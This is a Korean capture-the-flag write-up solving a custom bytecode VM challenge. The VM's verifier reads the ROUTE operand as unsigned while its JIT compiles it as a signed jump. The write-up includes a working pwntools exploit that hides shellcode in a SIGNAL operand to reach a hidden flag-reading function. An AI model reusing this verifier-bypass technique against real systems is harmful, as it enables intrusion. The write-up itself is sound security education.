# 문제명

## 문제 설명

-방글라데시 독립전쟁 당시 현장 요원들은 파키스탄군에 대한 저항을 조율하기 위해 암호화된 통신에 의존했다. 복구된 통신 단말기는 여전히 작전 명령을 받아들이며 실행 전에 모든 전송 내용을 검증한다. 검증 유닛과 필드 엔진은 처리 경로에 대해 서로 일치하지 않을 수 있다.


-`nc 45.56.67.129 53916`


## 풀이

### 분석
바이너리는 자체 바이트코드 VM으로, 업로드 → 검증(Verify) → 실행(Execute) 순서로 동작한다.
opcode는 5종류(WAIT, SIGNAL, ROUTE, END, FREEDOM)이며 검증 함수와 실제 실행 시
바이트코드를 x86 머신코드로 컴파일하는 JIT 함수가 각각 따로 존재한다.

또한 아무 데서도 호출되지 않는 죽은 함수가 있음을 확인했다. 
open("flag.txt") → read → write(1, buf, n)  

No PIE라 주소가 0x401bb0으로 고정된다

### 취약점
ROUTE opcode의 오퍼랜드 해석이 검증기와 실행기에서 다르다.

- 검증기: 오퍼랜드를 부호 없음으로 읽고 범위만 체크. 실제로는 점프하지 않고 그냥 다음 명령으로 진행
- 실행기(JIT): 오퍼랜드를 부호 있음으로 읽어 실제 jmp 명령으로 컴파일

즉 검증기는 opcode 나열이 문법적으로 맞는지만 보고 실행 시 진짜 어디로 점프하는지는 검사하지 않는다. 이를 이용해 SIGNAL의 오퍼랜드(검증기가 내용 검사 안 하는 8바이트)에셸코드를 숨기고 ROUTE로 그 위치에 정확히 점프시켜 실행할 수 있다.

### 익스플로잇

push 0x401bb0; ret (6바이트, 68 b0 1b 40 00 c3)를 SIGNAL의 8바이트 오퍼랜드에 심고 직전 ROUTE가 정확히 그 위치로 점프하게 만든다.

```python
from pwn import *
import sys

HOST, PORT = sys.argv[1], int(sys.argv[2])
WIN_FUNC = 0x401bb0

payload = bytes([
    0x30, 0x02,
    0x20, 0x68, *WIN_FUNC.to_bytes(4, 'little'), 0xc3, 0x90, 0x90,
    0x40
])

io = remote(HOST, PORT)
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Hex transmission: ', payload.hex().encode())
io.sendlineafter(b'> ', b'3')
io.sendlineafter(b'> ', b'4')
print(io.recvall(timeout=5).decode())
'''

## 배운 점
-검증기와 실행기가 같은 데이터를 다른 방식으로 해석해보면 검증은 통과하지만 실행은 다르게 되는 취약점이 생긴다. eBPF verifier 우회류와 같은 패턴이고 분기 명령어 하나만으로 데이터 영역을 코드로 둔갑시킬 수 있음을 확인했다.
